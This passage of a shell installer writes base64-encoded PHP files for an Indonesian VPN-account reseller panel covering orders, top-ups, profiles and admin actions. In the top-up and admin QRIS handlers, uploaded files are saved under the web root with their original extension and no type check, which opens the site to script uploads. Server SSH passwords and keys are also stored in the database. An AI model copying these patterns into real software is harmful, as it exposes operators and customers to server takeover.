obyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidUaXBlIHRpZGFrIHZhbGlkJ10pOyBleGl0Owp9CgokZGIgPSBnZXREQigpOwoKLy8gQW1iaWwgc2VydmVyCiRzdCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSBzZXJ2ZXJzIFdIRVJFIGlkPT8gQU5EIHN0YXR1cz0ncmVhZHknIik7CiRzdC0+ZXhlY3V0ZShbJHNlcnZlcklkXSk7ICRzZXJ2ZXIgPSAkc3QtPmZldGNoKCk7CmlmICghJHNlcnZlcikgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1NlcnZlciB0aWRhayB0ZXJzZWRpYSddKTsgZXhpdDsgfQoKLy8gSGl0dW5nIGhhcmdhCiRoYXJnYUhhcmkgID0gKGZsb2F0KSRzZXJ2ZXJbJ2hhcmdhX2hhcmknXTsKJGhhcmdhQnVsYW4gPSAoZmxvYXQpJHNlcnZlclsnaGFyZ2FfYnVsYW4nXTsKJGhhcmdhID0gJGRheXMgPj0gMzAKICAgID8gKCRoYXJnYUJ1bGFuICogZmxvb3IoJGRheXMvMzApKSArICgkaGFyZ2FIYXJpICogKCRkYXlzJTMwKSkKICAgIDogJGhhcmdhSGFyaSAqICRkYXlzOwoKLy8gVHJpYWwgY2hlY2sKaWYgKCRpc1RyaWFsKSB7CiAgICAkdXNlZCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIENPVU5UKCopIEZST00gdnBuX2FjY291bnRzIFdIRVJFIHVzZXJfaWQ9PyBBTkQgaXNfdHJpYWw9MSBBTkQgREFURShjcmVhdGVkX2F0KT1DVVJEQVRFKCkiKTsKICAgICR1c2VkLT5leGVjdXRlKFskdXNlcklkXSk7CiAgICBpZiAoKGludCkkdXNlZC0+ZmV0Y2hDb2x1bW4oKSA+IDApIHsKICAgICAgICBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J0thbXUgc3VkYWggYW1iaWwgdHJpYWwgaGFyaSBpbmkuIENvYmEgbGFnaSBiZXNvay4nXSk7IGV4aXQ7CiAgICB9CiAgICAkaGFyZ2EgPSAwOyAkZGF5cyA9IDE7ICRpc1RyaWFsID0gdHJ1ZTsKfSBlbHNlIHsKICAgIC8vIENlayBzYWxkbwogICAgJHUgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBzYWxkbyBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsKICAgICR1LT5leGVjdXRlKFskdXNlcklkXSk7ICR1c2VyID0gJHUtPmZldGNoKCk7CiAgICBpZiAoKGZsb2F0KSR1c2VyWydzYWxkbyddIDwgJGhhcmdhKSB7CiAgICAgICAgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidTYWxkbyB0aWRhayBjdWt1cCEgU2FsZG8ga2FtdTogJy5mb3JtYXRSdXBpYWgoJHVzZXJbJ3NhbGRvJ10pXSk7IGV4aXQ7CiAgICB9Cn0KCi8vIEJ1YXQgYWt1biBkaSBzZXJ2ZXIKJHJlc3VsdCA9IFZQTk1hbmFnZXI6OmNyZWF0ZUFjY291bnQoJHNlcnZlciwgJHRpcGUsICR1c2VybmFtZSwgJGRheXMsCiAgICAoaW50KSgkc2VydmVyWydxdW90YV9saW1pdCddID8/IDEwMCksIChpbnQpKCRzZXJ2ZXJbJ2lwX2xpbWl0J10gPz8gMikpOwoKaWYgKCEkcmVzdWx0WydzdWNjZXNzJ10pIHsKICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7IGV4aXQ7Cn0KCiRkYi0+YmVnaW5UcmFuc2FjdGlvbigpOwp0cnkgewogICAgLy8gS3VyYW5naSBzYWxkbyAoamlrYSBidWthbiB0cmlhbCkKICAgIGlmICghJGlzVHJpYWwgJiYgJGhhcmdhID4gMCkgewogICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHVzZXJzIFNFVCBzYWxkbz1zYWxkby0/IFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbJGhhcmdhLCAkdXNlcklkXSk7CiAgICB9CgogICAgLy8gSGl0dW5nIG1hc2EgYWt0aWYKICAgICRleHBpcnkgPSAkaXNUcmlhbAogICAgICAgID8gZGF0ZSgnWS1tLWQgSDppOnMnLCBzdHJ0b3RpbWUoJysxIGhvdXInKSkKICAgICAgICA6IGRhdGUoJ1ktbS1kIEg6aTpzJywgc3RydG90aW1lKCIreyRkYXlzfSBkYXlzIikpOwoKICAgIC8vIFNpbXBhbiBha3VuCiAgICAkaW5zID0gJGRiLT5wcmVwYXJlKCJJTlNFUlQgSU5UTyB2cG5fYWNjb3VudHMgCiAgICAgICAgKHVzZXJfaWQsc2VydmVyX2lkLHRpcGUsdXNlcm5hbWUsdXVpZCxwYXNzd29yZF92cG4sbGlua19jb25maWcsbGlua190bHMsbGlua19ub250bHMsbGlua19ncnBjLG1hc2FfYWt0aWYsZGF5c19vcmRlcmVkLGlzX3RyaWFsLGhhcmdhX3RvdGFsLHN0YXR1cykKICAgICAgICBWQUxVRVMgKD8sPyw/LD8sPyw/LD8sPyw/LD8sPyw/LD8sPywnYWN0aXZlJykiKTsKICAgICRpbnMtPmV4ZWN1dGUoWwogICAgICAgICR1c2VySWQsICRzZXJ2ZXJJZCwgJHRpcGUsICR1c2VybmFtZSwKICAgICAgICAkcmVzdWx0Wyd1dWlkJ10gPz8gbnVsbCwKICAgICAgICAkcmVzdWx0WydwYXNzd29yZCddID8/ICRyZXN1bHRbJ3V1aWQnXSA/PyBudWxsLAogICAgICAgICRyZXN1bHRbJ2xpbmtfY29uZmlnJ10gPz8gJHJlc3VsdFsnbGlua190bHMnXSA/PyBudWxsLAogICAgICAgICRyZXN1bHRbJ2xpbmtfdGxzJ10gPz8gbnVsbCwKICAgICAgICAkcmVzdWx0WydsaW5rX25vbnRscyddID8/IG51bGwsCiAgICAgICAgJHJlc3VsdFsnbGlua19ncnBjJ10gPz8gbnVsbCwKICAgICAgICAkZXhwaXJ5LCAkZGF5cywgJGlzVHJpYWwgPyAxIDogMCwgJGhhcmdhCiAgICBdKTsKCiAgICAvLyBDYXRhdCB0cmFuc2Frc2kKICAgIGlmICghJGlzVHJpYWwpIHsKICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRyYW5zYWN0aW9ucyAodXNlcl9pZCx0eXBlLGFtb3VudCxrZXRlcmFuZ2FuLHN0YXR1cykgVkFMVUVTICg/LD8sPyw/LCdzdWNjZXNzJykiKQogICAgICAgICAgIC0+ZXhlY3V0ZShbJHVzZXJJZCwgJ29yZGVyJywgJGhhcmdhLCAiT3JkZXIgeyR0aXBlfSAtIHskdXNlcm5hbWV9ICh7JGRheXN9IGhhcmkpIl0pOwogICAgfSBlbHNlIHsKICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRyYW5zYWN0aW9ucyAodXNlcl9pZCx0eXBlLGFtb3VudCxrZXRlcmFuZ2FuLHN0YXR1cykgVkFMVUVTICg/LD8sMCw/LCdzdWNjZXNzJykiKQogICAgICAgICAgIC0+ZXhlY3V0ZShbJHVzZXJJZCwgJ3RyaWFsJywgIlRyaWFsIHskdGlwZX0gLSB7JHVzZXJuYW1lfSAoMSBqYW0pIl0pOwogICAgfQoKICAgICRkYi0+Y29tbWl0KCk7CgogICAgLy8gVGFtYmFoIGluZm8ga2UgcmVzcG9uc2UKICAgICRyZXN1bHRbJ2V4cGlyZWQnXSA9ICRpc1RyaWFsCiAgICAgICAgPyBkYXRlKCdkIE0gWSwgSDppJywgc3RydG90aW1lKCcrMSBob3VyJykpLicgKDEgSmFtIFRyaWFsKScKICAgICAgICA6IGRhdGUoJ2QgTSBZJywgc3RydG90aW1lKCIreyRkYXlzfSBkYXlzIikpOwogICAgJHJlc3VsdFsnaGFyZ2EnXSAgID0gZm9ybWF0UnVwaWFoKCRoYXJnYSk7CiAgICAkcmVzdWx0Wydpc190cmlhbCddPSAkaXNUcmlhbDsKCiAgICAvLyBOb3RpZiBUZWxlZ3JhbQogICAgJG5vdGlmTXNnID0gJGlzVHJpYWwKICAgICAgICA/ICLimqEgPGI+VHJpYWwgQmFydTwvYj5cblVzZXI6IHskdXNlcm5hbWV9XG5UaXBlOiB7JHRpcGV9XG5TZXJ2ZXI6IHskc2VydmVyWyduYW1hX3NlcnZlciddfSIKICAgICAgICA6ICLwn5uSIDxiPk9yZGVyIEJhcnU8L2I+XG5Vc2VyOiB7JHVzZXJuYW1lfVxuVGlwZTogeyR0aXBlfVxuU2VydmVyOiB7JHNlcnZlclsnbmFtYV9zZXJ2ZXInXX1cbkR1cmFzaTogeyRkYXlzfSBoYXJpXG5Ub3RhbDogIi5mb3JtYXRSdXBpYWgoJGhhcmdhKTsKICAgIHNlbmRUZWxlZ3JhbU5vdGlmKCRub3RpZk1zZyk7CgogICAgZWNobyBqc29uX2VuY29kZSgkcmVzdWx0KTsKCn0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgJGRiLT5yb2xsYmFjaygpOwogICAgLy8gUm9sbGJhY2sgYWt1biBkaSBzZXJ2ZXIgamlrYSBEQiBlcnJvcgogICAgVlBOTWFuYWdlcjo6ZGVsZXRlQWNjb3VudCgkc2VydmVyLCAkdGlwZSwgJHVzZXJuYW1lKTsKICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nREIgZXJyb3I6ICcuJGUtPmdldE1lc3NhZ2UoKV0pOwp9Cg==" | base64 -d > "$DIR"/api/create_order.php
    # api/delete_account.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy92cG5fbWFuYWdlci5waHAnOwokc2Vzc2lvbiA9IHJlcXVpcmVMb2dpbigpOwpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpOwoKJHVzZXJJZCAgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokYWt1bklkICA9IChpbnQpKCRfUE9TVFsnYWt1bl9pZCddID8/IDApOwppZiAoISRha3VuSWQpIHsgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidJRCB0aWRhayB2YWxpZCddKTsgZXhpdDsgfQoKJGRiID0gZ2V0REIoKTsKLy8gQW1iaWwgYWt1biBtaWxpayB1c2VyIGluaSBzYWphIChrZWFtYW5hbikKJHN0ID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgdmEuKiwgcy5ob3N0LCBzLnBvcnQsIHMuc3NoX3VzZXIsIHMuc3NoX3Bhc3N3b3JkLCBzLnNzaF9rZXkgCiAgICBGUk9NIHZwbl9hY2NvdW50cyB2YSBKT0lOIHNlcnZlcnMgcyBPTiB2YS5zZXJ2ZXJfaWQ9cy5pZCAKICAgIFdIRVJFIHZhLmlkPT8gQU5EIHZhLnVzZXJfaWQ9PyIpOwokc3QtPmV4ZWN1dGUoWyRha3VuSWQsICR1c2VySWRdKTsgJGFrdW4gPSAkc3QtPmZldGNoKCk7CmlmICghJGFrdW4pIHsgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidBa3VuIHRpZGFrIGRpdGVtdWthbiddKTsgZXhpdDsgfQoKLy8gSGFwdXMgZGFyaSBzZXJ2ZXIgVlBOIChmaXggdXRhbWEpCiRyZXMgPSBWUE5NYW5hZ2VyOjpkZWxldGVBY2NvdW50KCRha3VuLCAkYWt1blsndGlwZSddLCAkYWt1blsndXNlcm5hbWUnXSk7CgovLyBIYXB1cyBkYXJpIERCIG1lc2tpIHNlcnZlciBlcnJvciAoYWt1biBtdW5na2luIHN1ZGFoIHRpZGFrIGFkYSkKJGRiLT5wcmVwYXJlKCJERUxFVEUgRlJPTSB2cG5fYWNjb3VudHMgV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskYWt1bklkXSk7CgplY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PnRydWUsJ21lc3NhZ2UnPT4nQWt1biBiZXJoYXNpbCBkaWhhcHVzIGRhcmkgc2VydmVyIGRhbiBkYXRhYmFzZSddKTsK" | base64 -d > "$DIR"/api/delete_account.php
    # api/topup.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKJHNlc3Npb24gPSByZXF1aXJlTG9naW4oKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsKCiR1c2VySWQgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokYW1vdW50ID0gKGZsb2F0KSgkX1BPU1RbJ2Ftb3VudCddID8/IDApOwokbWV0aG9kID0gc2FuaXRpemUoJF9QT1NUWydwYXltZW50X21ldGhvZCddID8/ICdtYW51YWxfdHJhbnNmZXInKTsKCmlmICgkYW1vdW50IDwgNTAwMCkgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J05vbWluYWwgbWluaW1hbCBScCA1LjAwMCddKTsgZXhpdDsgfQppZiAoJGFtb3VudCA+IDEwMDAwMDApIHsgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidOb21pbmFsIG1ha3NpbWFsIFJwIDEuMDAwLjAwMCddKTsgZXhpdDsgfQoKJGRiID0gZ2V0REIoKTsKJGJ1a3RpUGF0aCA9IG51bGw7CgovLyBVcGxvYWQgYnVrdGkKaWYgKCFlbXB0eSgkX0ZJTEVTWydidWt0aSddWyd0bXBfbmFtZSddKSkgewogICAgJHVwbG9hZERpciA9IF9fRElSX18uJy8uLi91cGxvYWRzL2J1a3RpLyc7CiAgICBpZiAoIWlzX2RpcigkdXBsb2FkRGlyKSkgbWtkaXIoJHVwbG9hZERpciwgMDc1NSwgdHJ1ZSk7CiAgICAkZXh0ID0gcGF0aGluZm8oJF9GSUxFU1snYnVrdGknXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pOwogICAgJGZuYW1lID0gJ2J1a3RpXycudGltZSgpLidfJy4kdXNlcklkLicuJy4kZXh0OwogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydidWt0aSddWyd0bXBfbmFtZSddLCAkdXBsb2FkRGlyLiRmbmFtZSkpIHsKICAgICAgICAkYnVrdGlQYXRoID0gJy9vcmRlcnZwbi91cGxvYWRzL2J1a3RpLycuJGZuYW1lOwogICAgfQp9CgokZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRvcHVwX3JlcXVlc3RzICh1c2VyX2lkLCBhbW91bnQsIHBheW1lbnRfbWV0aG9kLCBidWt0aV90cmFuc2ZlcikgVkFMVUVTICg/LD8sPyw/KSIpCiAgIC0+ZXhlY3V0ZShbJHVzZXJJZCwgJGFtb3VudCwgJG1ldGhvZCwgJGJ1a3RpUGF0aF0pOwoKLy8gTm90aWYgYWRtaW4KJHUgPSAkZGItPnByZXBhcmUoIlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsgJHUtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHVuYW1lPSR1LT5mZXRjaENvbHVtbigpOwpzZW5kVGVsZWdyYW1Ob3RpZigi8J+SsCA8Yj5Ub3B1cCBCYXJ1PC9iPlxuVXNlcjogeyR1bmFtZX1cbk5vbWluYWw6ICIuZm9ybWF0UnVwaWFoKCRhbW91bnQpLiJcbk1ldG9kZTogeyRtZXRob2R9XG5TdGF0dXM6IE1lbnVuZ2d1IGtvbmZpcm1hc2kgYWRtaW4iKTsKCmVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJz0+dHJ1ZSwnbWVzc2FnZSc9PiJQZXJtaW50YWFuIHRvcHVwICIuZm9ybWF0UnVwaWFoKCRhbW91bnQpLiIgYmVyaGFzaWwgZGlraXJpbSEgVHVuZ2d1IGtvbmZpcm1hc2kgYWRtaW4uIl0pOwo=" | base64 -d > "$DIR"/api/topup.php
    # api/update_profile.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKJHNlc3Npb24gPSByZXF1aXJlTG9naW4oKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsKCiR1c2VySWQgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokZW1haWwgID0gc2FuaXRpemUoJF9QT1NUWydlbWFpbCddID8/ICcnKTsKJHdhICAgICA9IHNhbml0aXplKCRfUE9TVFsnd2hhdHNhcHAnXSA/PyAnJyk7CiRwYXNzICAgPSAkX1BPU1RbJ3Bhc3N3b3JkJ10gPz8gJyc7CgppZiAoIWZpbHRlcl92YXIoJGVtYWlsLCBGSUxURVJfVkFMSURBVEVfRU1BSUwpKSB7CiAgICBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J0Zvcm1hdCBlbWFpbCB0aWRhayB2YWxpZCddKTsgZXhpdDsKfQoKJGRiID0gZ2V0REIoKTsKLy8gQ2VrIGR1cGxpa2F0IGVtYWlsCiRjaGsgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBpZCBGUk9NIHVzZXJzIFdIRVJFIGVtYWlsPT8gQU5EIGlkIT0/Iik7CiRjaGstPmV4ZWN1dGUoWyRlbWFpbCwgJHVzZXJJZF0pOwppZiAoJGNoay0+ZmV0Y2goKSkgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J0VtYWlsIHN1ZGFoIGRpZ3VuYWthbiddKTsgZXhpdDsgfQoKaWYgKCFlbXB0eSgkcGFzcykpIHsKICAgIGlmIChzdHJsZW4oJHBhc3MpIDwgNikgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1Bhc3N3b3JkIG1pbi4gNiBrYXJha3RlciddKTsgZXhpdDsgfQogICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgdXNlcnMgU0VUIGVtYWlsPT8sIHdoYXRzYXBwPT8sIHBhc3N3b3JkPT8gV0hFUkUgaWQ9PyIpCiAgICAgICAtPmV4ZWN1dGUoWyRlbWFpbCwgJHdhLCBwYXNzd29yZF9oYXNoKCRwYXNzLCBQQVNTV09SRF9CQ1JZUFQpLCAkdXNlcklkXSk7Cn0gZWxzZSB7CiAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgZW1haWw9Pywgd2hhdHNhcHA9PyBXSEVSRSBpZD0/IikKICAgICAgIC0+ZXhlY3V0ZShbJGVtYWlsLCAkd2EsICR1c2VySWRdKTsKfQplY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PnRydWUsJ21lc3NhZ2UnPT4nUHJvZmlsIGJlcmhhc2lsIGRpcGVyYmFydWknXSk7Cg==" | base64 -d > "$DIR"/api/update_profile.php
    # api/logout.php
    echo "PD9waHAKaWYgKHNlc3Npb25fc3RhdHVzKCk9PT1QSFBfU0VTU0lPTl9OT05FKSBzZXNzaW9uX3N0YXJ0KCk7CnNlc3Npb25fZGVzdHJveSgpOwpoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vJyk7CmV4aXQ7Cg==" | base64 -d > "$DIR"/api/logout.php
    # admin/index.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy92cG5fbWFuYWdlci5waHAnOwokc2Vzc2lvbiA9IHJlcXVpcmVBZG1pbigpOwokZGIgPSBnZXREQigpOwoKLy8gSGFuZGxlIFBPU1QgYWN0aW9ucwppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ109PT0nUE9TVCcpIHsKICAgICRhY3QgPSAkX1BPU1RbJ2FjdGlvbiddID8/ICcnOwoKICAgIGlmICgkYWN0PT09J2FwcHJvdmVfdG9wdXAnKSB7CiAgICAgICAgJHRpZCA9IChpbnQpJF9QT1NUWyd0b3B1cF9pZCddOwogICAgICAgICRyID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHRvcHVwX3JlcXVlc3RzIFdIRVJFIGlkPT8gQU5EIHN0YXR1cz0ncGVuZGluZyciKTsKICAgICAgICAkci0+ZXhlY3V0ZShbJHRpZF0pOyAkcmVxPSRyLT5mZXRjaCgpOwogICAgICAgIGlmICgkcmVxKSB7CiAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHRvcHVwX3JlcXVlc3RzIFNFVCBzdGF0dXM9J2FwcHJvdmVkJywgcHJvY2Vzc2VkX2F0PU5PVygpIFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbJHRpZF0pOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgc2FsZG89c2FsZG8rPyBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyRyZXFbJ2Ftb3VudCddLCRyZXFbJ3VzZXJfaWQnXV0pOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHRyYW5zYWN0aW9ucyAodXNlcl9pZCx0eXBlLGFtb3VudCxrZXRlcmFuZ2FuLHN0YXR1cykgVkFMVUVTICg/LD8sPyw/LCdzdWNjZXNzJykiKQogICAgICAgICAgICAgICAtPmV4ZWN1dGUoWyRyZXFbJ3VzZXJfaWQnXSwndG9wdXAnLCRyZXFbJ2Ftb3VudCddLCdUb3B1cCBkaXNldHVqdWkgYWRtaW4nXSk7CiAgICAgICAgICAgICR1PSRkYi0+cHJlcGFyZSgiU0VMRUNUIHVzZXJuYW1lIEZST00gdXNlcnMgV0hFUkUgaWQ9PyIpOyR1LT5leGVjdXRlKFskcmVxWyd1c2VyX2lkJ11dKTskdW5hbWU9JHUtPmZldGNoQ29sdW1uKCk7CiAgICAgICAgICAgIHNlbmRUZWxlZ3JhbU5vdGlmKCLinIUgVG9wdXAgPGI+eyR1bmFtZX08L2I+ICIuZm9ybWF0UnVwaWFoKCRyZXFbJ2Ftb3VudCddKS4iIGRpc2V0dWp1aSIpOwogICAgICAgIH0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vYWRtaW4vJyk7IGV4aXQ7CiAgICB9CgogICAgaWYgKCRhY3Q9PT0ncmVqZWN0X3RvcHVwJykgewogICAgICAgICR0aWQ9KGludCkkX1BPU1RbJ3RvcHVwX2lkJ107CiAgICAgICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgdG9wdXBfcmVxdWVzdHMgU0VUIHN0YXR1cz0ncmVqZWN0ZWQnLCBhZG1pbl9ub3RlPT8sIHByb2Nlc3NlZF9hdD1OT1coKSBXSEVSRSBpZD0/IikKICAgICAgICAgICAtPmV4ZWN1dGUoW3Nhbml0aXplKCRfUE9TVFsnbm90ZSddPz8nJyksJHRpZF0pOwogICAgICAgIGhlYWRlcignTG9jYXRpb246IC9vcmRlcnZwbi9hZG1pbi8nKTsgZXhpdDsKICAgIH0KCiAgICBpZiAoJGFjdD09PSdhZGRfc2VydmVyJykgewogICAgICAgICRkYi0+cHJlcGFyZSgiSU5TRVJUIElOVE8gc2VydmVycyAobmFtYV9zZXJ2ZXIsY29kZV9zZXJ2ZXIsbG9rYXNpLGZsYWcsaGFyZ2FfaGFyaSxoYXJnYV9idWxhbixob3N0LHBvcnQsc3NoX3VzZXIsc3NoX3Bhc3N3b3JkLHNzaF9rZXksZG9tYWluLHN0YXR1cykgVkFMVUVTICg/LD8sPyw/LD8sPyw/LD8sPyw/LD8sPywncmVhZHknKSIpCiAgICAgICAgICAgLT5leGVjdXRlKFsKICAgICAgICAgICAgICAgc2FuaXRpemUoJF9QT1NUWyduYW1hX3NlcnZlciddKSwgc2FuaXRpemUoJF9QT1NUWydjb2RlX3NlcnZlciddKSwKICAgICAgICAgICAgICAgc2FuaXRpemUoJF9QT1NUWydsb2thc2knXSksIHNhbml0aXplKCRfUE9TVFsnZmxhZyddPz8n8J+HrvCfh6knKSwKICAgICAgICAgICAgICAgKGZsb2F0KSRfUE9TVFsnaGFyZ2FfaGFyaSddLCAoZmxvYXQpJF9QT1NUWydoYXJnYV9idWxhbiddLAogICAgICAgICAgICAgICBzYW5pdGl6ZSgkX1BPU1RbJ2hvc3QnXSksIChpbnQpKCRfUE9TVFsncG9ydCddPz8yMiksCiAgICAgICAgICAgICAgIHNhbml0aXplKCRfUE9TVFsnc3NoX3VzZXInXT8/J3Jvb3QnKSwgc2FuaXRpemUoJF9QT1NUWydzc2hfcGFzc3dvcmQnXT8/JycpLAogICAgICAgICAgICAgICBzYW5pdGl6ZSgkX1BPU1RbJ3NzaF9rZXknXT8/JycpLCBzYW5pdGl6ZSgkX1BPU1RbJ2RvbWFpbiddPz8nJyksCiAgICAgICAgICAgXSk7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLycpOyBleGl0OwogICAgfQoKICAgIGlmICgkYWN0PT09J2RlbGV0ZV9zZXJ2ZXInKSB7CiAgICAgICAgJGRiLT5wcmVwYXJlKCJERUxFVEUgRlJPTSBzZXJ2ZXJzIFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbKGludCkkX1BPU1RbJ3NlcnZlcl9pZCddXSk7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLycpOyBleGl0OwogICAgfQoKICAgIGlmICgkYWN0PT09J3NhdmVfc2V0dGluZ3MnKSB7CiAgICAgICAgJGtleXM9WydhcHBfbmFtZScsJ2FwcF9sb2dvJywnY29udGFjdF93YScsJ2NvbnRhY3RfdGcnLCdjb250YWN0X2lnJywKICAgICAgICAgICAgICAgJ2JhbmtfbmFtZScsJ2JhbmtfYWNjb3VudCcsJ2JhbmtfaG9sZGVyJywnZGFuYV9udW1iZXInLCdnb3BheV9udW1iZXInLCdzaG9wZWVfbnVtYmVyJywKICAgICAgICAgICAgICAgJ3NtdHBfaG9zdCcsJ3NtdHBfcG9ydCcsJ3NtdHBfdXNlcicsJ3NtdHBfcGFzcycsJ3NtdHBfZnJvbScsCiAgICAgICAgICAgICAgICd0Z19ib3RfdG9rZW4nLCd0Z19jaGF0X2lkJywndHJpcGF5X2FwaV9rZXknLCd0cmlwYXlfcHJpdmF0ZV9rZXknLCd0cmlwYXlfbWVyY2hhbnRfY29kZScsJ3RyaXBheV9tb2RlJywKICAgICAgICAgICAgICAgJ3RyaWFsX2R1cmF0aW9uX2hvdXJzJywndHJpYWxfcXVvdGFfZ2InXTsKICAgICAgICBmb3JlYWNoKCRrZXlzIGFzICRrKXsKICAgICAgICAgICAgaWYoaXNzZXQoJF9QT1NUWyRrXSkpewogICAgICAgICAgICAgICAgJGRiLT5wcmVwYXJlKCJJTlNFUlQgSU5UTyBhcHBfc2V0dGluZ3MgKHNldHRpbmdfa2V5LHNldHRpbmdfdmFsdWUpIFZBTFVFUyAoPyw/KSBPTiBEVVBMSUNBVEUgS0VZIFVQREFURSBzZXR0aW5nX3ZhbHVlPT8iKQogICAgICAgICAgICAgICAgICAgLT5leGVjdXRlKFskayxzYW5pdGl6ZSgkX1BPU1RbJGtdKSxzYW5pdGl6ZSgkX1BPU1RbJGtdKV0pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vIFFSSVMgaW1hZ2UgdXBsb2FkCiAgICAgICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydxcmlzX2ltYWdlJ11bJ3RtcF9uYW1lJ10pKSB7CiAgICAgICAgICAgICR1cGxvYWREaXI9X19ESVJfXy4nLy4uL3VwbG9hZHMvJzsgaWYoIWlzX2RpcigkdXBsb2FkRGlyKSkgbWtkaXIoJHVwbG9hZERpciwwNzU1LHRydWUpOwogICAgICAgICAgICAkZXh0PXBhdGhpbmZvKCRfRklMRVNbJ3FyaXNfaW1hZ2UnXVsnbmFtZSddLFBBVEhJTkZPX0VYVEVOU0lPTik7CiAgICAgICAgICAgICRmbmFtZT0ncXJpcy4nLiRleHQ7CiAgICAgICAgICAgIGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydxcmlzX2ltYWdlJ11bJ3RtcF9uYW1lJ10sJHVwbG9hZERpci4kZm5hbWUpKXsKICAgICAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiSU5TRVJUIElOVE8gYXBwX3NldHRpbmdzIChzZXR0aW5nX2tleSxzZXR0aW5nX3ZhbHVlKSBWQUxVRVMgKCdxcmlzX2ltYWdlJyw/KSBPTiBEVVBMSUNBVEUgS0VZIFVQREFURSBzZXR0aW5nX3ZhbHVlPT8iKQogICAgICAgICAgICAgICAgICAgLT5leGVjdXRlKFsnL29yZGVydnBuL3VwbG9hZHMvJy4kZm5hbWUsJy9vcmRlcnZwbi91cGxvYWRzLycuJGZuYW1lXSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZ